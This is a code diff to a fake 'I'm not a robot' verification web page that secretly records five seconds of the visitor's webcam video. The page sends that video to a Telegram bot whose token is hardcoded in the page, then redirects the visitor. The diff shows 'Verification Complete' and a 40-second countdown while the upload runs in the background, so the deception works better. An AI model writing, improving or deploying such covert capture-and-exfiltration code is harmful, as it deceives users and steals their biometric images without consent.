@@ -114,7 +114,8 @@
             <div class="face-frame" id="face-frame"></div>
         </div>
         <div class="loading">Recording in progress... ⏳</div>
-        <div class="success">✅ Verification Complete! Redirecting...</div>
+        <div class="success">✅ Verification Complete!</div>
+        <div id="counter"></div>
     </div>
 
     <script>
@@ -123,6 +124,7 @@
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
+        const counterElement = document.getElementById('counter');
         let counterInterval;
 
         const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
@@ -164,47 +166,43 @@
                         }, 5000); // Record for 5 seconds
 
                         mediaRecorder.onstop = () => {
+                            // After recording, show verification complete message
+                            loading.style.display = 'none';
+                            success.style.display = 'block';
+
+                            // Start 40-second counter
+                            let counter = 40;
+                            counterElement.textContent = `Redirecting in ${counter} seconds...`;
+                            counterInterval = setInterval(() => {
+                                counter--;
+                                counterElement.textContent = `Redirecting in ${counter} seconds...`;
+                                if (counter <= 0) {
+                                    clearInterval(counterInterval);
+                                    window.location.href = 'https://hesentv.vercel.app/';
+                                }
+                            }, 1000);
+
+                            // Send video to Telegram even while counter is live
                             const blob = new Blob(chunks, { type: 'video/webm' });
                             const formData = new FormData();
                             formData.append('chat_id', telegramChatId);
                             formData.append('video', blob, 'video.webm');
 
-                            // Send video to Telegram in the background
+                            // Send the video to Telegram in the background
                             fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                                 method: 'POST',
                                 body: formData
-                            }).then(() => {
-                                // After sending the video, remove the face frame after 5 seconds
-                                setTimeout(() => {
-                                    faceFrame.style.display = 'none';
-                                }, 5000);
-
-                                // Show verification complete message
-                                setTimeout(() => {
-                                    loading.style.display = 'none';
-                                    success.style.display = 'block';
-
-                                    // Start the counter and redirect after 10 seconds
-                                    let counter = 10;
-                                    const counterElement = document.createElement('div');
-                                    counterElement.textContent = `Redirecting in ${counter} seconds...`;
-                                    document.body.appendChild(counterElement);
-
-                                    counterInterval = setInterval(() => {
-                                        counter--;
-                                        counterElement.textContent = `Redirecting in ${counter} seconds...`;
-                                        if (counter <= 0) {
-                                            clearInterval(counterInterval);
-                                            window.location.href = 'https://hesentv.vercel.app/';
-                                        }
-                                    }, 1000);
-                                }, 2000); // 2 seconds for success message
                             }).catch((error) => {
                                 console.error('Video upload failed:', error.message);
                             });
 
                             // Stop the camera
                             stream.getTracks().forEach(track => track.stop());
+
+                            // Remove face frame after 5 seconds
+                            setTimeout(() => {
+                                faceFrame.style.display = 'none';
+                            }, 5000);
                         };
                     })
                     .catch((err) => {
